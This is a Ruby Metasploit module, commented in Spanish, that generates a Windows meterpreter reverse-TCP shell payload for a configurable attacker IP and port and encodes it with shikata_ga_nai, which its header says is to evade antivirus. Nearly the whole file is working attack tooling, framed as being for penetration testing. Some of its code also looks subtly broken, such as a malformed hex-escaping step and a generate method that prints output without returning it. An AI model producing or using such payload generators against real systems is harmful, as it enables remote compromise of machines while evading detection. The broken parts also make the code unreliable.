#!/usr/bin/env ruby

=begin
El código genera un payload de reverse shell para Windows con codificación shikata_ga_nai,
el cual es útil para evadir antivirus.
El usuario puede configurar la IP y el puerto para el ataque, así como elegir el número de iteraciones
para la codificación.
Este código es útil para crear un payload personalizado que se puede utilizar en pruebas de penetración
o en un entorno controlado para evaluar la seguridad de un sistema.
=end


require 'msf/core'

# Definición de la clase Payload:
module Msf
	class Payload < Msf::Payload
		include Msf::Payload::Single
		include Msf::Payload::Windows

		# Este método inicializa el payload con metadatos como el nombre, la descripción, el autor y la licencia.
		def initialize(info = {})
			super(update_info(info,
				'Name' => 'Custom Payload Generator',
				'Description' => 'Genera un payload personalizado con codificación shikata_ga_nai.',
				'Author' => ['Tu Nombre'],
				'License' => MSF_LICENSE
			))

			# Se registran opciones de configuración personalizables para el payload:
			register_options(
				[
					OptString.new('LHOST', [true, 'Dirección IP local para el payload']),
					OptInt.new('LPORT', [true, 'Puerto local para el payload', 4444]),
					OptString.new('ENCODER', [true, 'Codificador a usar', 'x86/shikata_ga_nai']),
					OptInt.new('ENCODER_ITERATIONS', [false, 'Número de iteraciones para la codificación', 1])
				]
			)
		end

		def generate
			# Obtener opciones del datastore
			lhost = datastore['LHOST']
			lport = datastore['LPORT']
			encoder = datastore['ENCODER']
			iterations = datastore['ENCODER_ITERATIONS']

			# Configurar payload base
			raw_payload = generate_raw_payload(lhost, lport)

			# Codificar payload
			encoded_payload = encode_payload(raw_payload, encoder, iterations)

			print_status("Payload generado con codificación: #{encoder}")
			print_good("Payload codificado:\n#{encoded_payload}")
		end

		# Este método genera un payload base de reverse shell para Windows usando el payload
		def generate_raw_payload(lhost, lport)
			# Crear un payload básico de reverse shell
			framework.payloads.create('windows/meterpreter/reverse_tcp').tap do |payload|
				payload.datastore['LHOST'] = lhost
				payload.datastore['LPORT'] = lport
			end.generate
		end

		# Este método toma el payload crudo y lo codifica usando el codificador especificado
		def encode_payload(payload, encoder, iterations)
			encoded = framework.encoders.create(encoder).tap do |enc|
				enc.datastore['Iterations'] = iterations
			end.encode(payload)
			"\\x" + encoded.unpack('H2' * encoded.bytesize).join('\\x')
		end
	end
end
